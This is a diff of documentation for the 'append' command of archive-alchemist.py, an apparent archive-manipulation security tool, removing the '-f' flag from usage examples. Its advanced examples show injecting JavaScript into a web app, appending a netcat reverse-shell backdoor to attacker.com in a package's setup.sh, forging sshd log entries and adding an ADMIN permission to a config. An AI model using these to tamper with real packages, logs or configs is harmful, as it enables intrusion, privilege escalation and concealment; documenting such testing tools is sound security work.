@@ -7,7 +7,7 @@ The `append` command adds additional content to the end of existing files in an 
 ## Syntax
 
 ```bash
-./archive-alchemist.py -f <archive> [-t <type>] append <path> [options]
+./archive-alchemist.py <archive> [-t <type>] append <path> [options]
 ```
 
 ## Options
@@ -26,31 +26,31 @@ The `append` command adds additional content to the end of existing files in an 
 
 ```bash
 # Append a new line to a text file
-./archive-alchemist.py -f archive.zip append config.txt --content "\nport=8080"
+./archive-alchemist.py archive.zip append config.txt --content "\nport=8080"
 
 # Append content without a newline
-./archive-alchemist.py -f archive.zip append data.txt --content "appended text"
+./archive-alchemist.py archive.zip append data.txt --content "appended text"
 ```
 
 ### Append Content from Another File
 
 ```bash
 # Append content from a local file
-./archive-alchemist.py -f archive.tar -t tar append logs/app.log --content-file /path/to/new_logs.txt
+./archive-alchemist.py archive.tar -t tar append logs/app.log --content-file /path/to/new_logs.txt
 ```
 
 ### Append Multiple Lines
 
 ```bash
 # Append multiple lines to a configuration file
-./archive-alchemist.py -f archive.zip append config.ini --content "\n[new_section]\nkey1=value1\nkey2=value2"
+./archive-alchemist.py archive.zip append config.ini --content "\n[new_section]\nkey1=value1\nkey2=value2"
 ```
 
 ### Append to Binary Files
 
 ```bash
 # Append data to a binary file
-./archive-alchemist.py -f archive.zip append data.bin --content-file /path/to/binary_chunk
+./archive-alchemist.py archive.zip append data.bin --content-file /path/to/binary_chunk
 ```
 
 ## Advanced Examples
@@ -59,24 +59,24 @@ The `append` command adds additional content to the end of existing files in an 
 
 ```bash
 # Inject JavaScript code into a JS file
-./archive-alchemist.py -f webapp.zip append assets/js/main.js --content "\n\nalert('Injected code');"
+./archive-alchemist.py webapp.zip append assets/js/main.js --content "\n\nalert('Injected code');"
 
 # Append a backdoor to a shell script
-./archive-alchemist.py -f package.tar -t tar append setup.sh --content "\n\n# Backdoor\nnc -e /bin/sh attacker.com 1337 &"
+./archive-alchemist.py package.tar -t tar append setup.sh --content "\n\n# Backdoor\nnc -e /bin/sh attacker.com 1337 &"
 ```
 
 ### Adding Lines to Log Files
 
 ```bash
 # Append fake log entries
-./archive-alchemist.py -f logs.zip append system.log --content "\nJun 15 14:30:45 server sshd[1234]: Accepted password for admin from 192.168.1.1"
+./archive-alchemist.py logs.zip append system.log --content "\nJun 15 14:30:45 server sshd[1234]: Accepted password for admin from 192.168.1.1"
 ```
 
 ### Adding Configuration Options
 
 ```bash
 # Append new configuration options
-./archive-alchemist.py -f app.zip append config/settings.xml --content "\n  <permission>ADMIN</permission>"
+./archive-alchemist.py app.zip append config/settings.xml --content "\n  <permission>ADMIN</permission>"
 ```
 
 ## Notes and Warnings
